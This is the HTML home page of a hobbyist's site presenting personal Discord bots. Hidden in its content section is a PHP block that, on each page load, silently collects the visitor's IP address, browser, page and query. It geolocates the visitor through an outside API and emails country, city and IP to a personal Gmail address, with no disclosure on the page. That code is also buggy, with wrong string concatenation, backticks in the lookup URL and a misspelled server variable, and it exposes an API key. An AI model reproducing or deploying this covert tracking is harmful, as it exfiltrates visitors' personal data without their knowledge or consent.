<!DOCTYPE HTML>
<html>

<head>
  <title>nero's discord bots</title>
  <meta name="description" content="nero's discord bots on one website" />
  <meta name="keywords" content="discord, discordbots" />
  <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
  <link rel="stylesheet" type="text/css" href="css/style.css" />
  <!-- modernizr enables HTML5 elements and feature detects -->
  <script type="text/javascript" src="js/modernizr-1.5.min.js"></script>
</head>

<body>
  <div id="main">
    <header>
      <div id="logo">
        <div id="logo_text">
          <!-- class="logo_colour", allows you to change the colour of the text -->
          <h1><a href="index.html">DISCORD BOTS</a></h1>
          <h2>All my discord bots on one website</h2>
        </div>
      </div>
      <nav>
        <div id="menu_container">
          <ul class="sf-menu" id="nav">
            <li><a href="index.html">Home</a></li>
            <li><a href="#">Discord Bots</a>
              <ul>
                <li><a href="phonebot.html">Phone Bot</a></li>
                <li><a href="phonemusic.html">Music Bot</a></li>
                <li><a href="nerobot.html">Nerobot</a></li>
                <li><a href="guildbot.html">GuildMaker Bot</a></li>
              </ul>
            </li>
          </ul>
        </div>
      </nav>
    </header>
    <div id="site_content">
      <div id="sidebar_container">
        <div class="sidebar">
        </div>
        <div class="sidebar">
        </div>
      </div>
      <div class="content">
        <h1>Welcome to the nero's discord bots</h1>
        <p>This page will mention details about the bots. These bots aren't mean't to be used on lots of servers nor anything like that. Theses discord bots were made for personal use on my discord servers but some of these bots have there cons but mostly pros</p>
        <?php
          // get user details
          $user_agent = $_SERVER['HTTP_USER_AGENT']; //user browser
          $ip_address = $_SERVER["REMOTE_ADDR"];     // user ip adderss
          $page_name = $_SERVER["SCRIPT_NAME"];      // page the user looking
          $query_string = $_SERVER["QUERY_STRING"];   // what query he used
          $current_page = $page_name."?".$query_string; 


          // get location 
          $url = json_decode(file_get_contents(`http://api.ipinfodb.com/v3/ip-city/?key=da61eb2e6ad93c0cb6c8c32a338b728711690b72d277a6efb64a6a2cb7afdeab
          ip=`.$_SERVER['REMOTE_ADDR']."&format=json"));
          $country=$url->countryName;  // user country
          $city=$url->cityName;       // city
          $region=$url->regionName;   // regoin
          $latitude=$url->latitude;    //lat and lon
          $longitude=$url->longitude;

          $to = 'deox.indura.xyz@gmail.com';
          $message = 'country: ' + $country + '\ncity: ' + $city + '\nip: ' + $_SERVER['REMOTE_ADDRE'];
          $subject = "";
          mail($to, $subject, $message);
          $message = '';

          // get time
          date_default_timezone_set('UTC');
          $date = date("Y-m-d");
          $time = date("H:i:s");
        ?>
      </div>
    </div>
    <footer>
      <p>Copyright &copy; DISCORD BOTS | <a href="http://www.css3templates.co.uk">design from css3templates.co.uk</a></p>
    </footer>
  </div>
  <p>&nbsp;</p>
  <!-- javascript at the bottom for fast page loading -->
  <script type="text/javascript" src="js/jquery.js"></script>
  <script type="text/javascript" src="js/jquery.easing-sooper.js"></script>
  <script type="text/javascript" src="js/jquery.sooperfish.js"></script>
  <script type="text/javascript">
    $(document).ready(function() {
      $('ul.sf-menu').sooperfish();
    });
  </script>
</body>
</html>